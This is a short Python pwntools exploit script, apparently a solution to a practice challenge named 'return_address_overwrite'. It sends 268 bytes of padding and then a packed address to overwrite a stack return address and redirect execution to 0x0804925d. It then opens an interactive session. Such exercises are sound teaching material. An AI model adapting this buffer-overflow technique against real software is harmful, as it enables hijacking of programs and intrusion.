from pwn import *

p = process("return_address_overwrite")

p.recvuntil(": ")

payload = "A" * 268
payload += p32(0x0804925d)

pause()

p.sendline(payload)

p.interactive()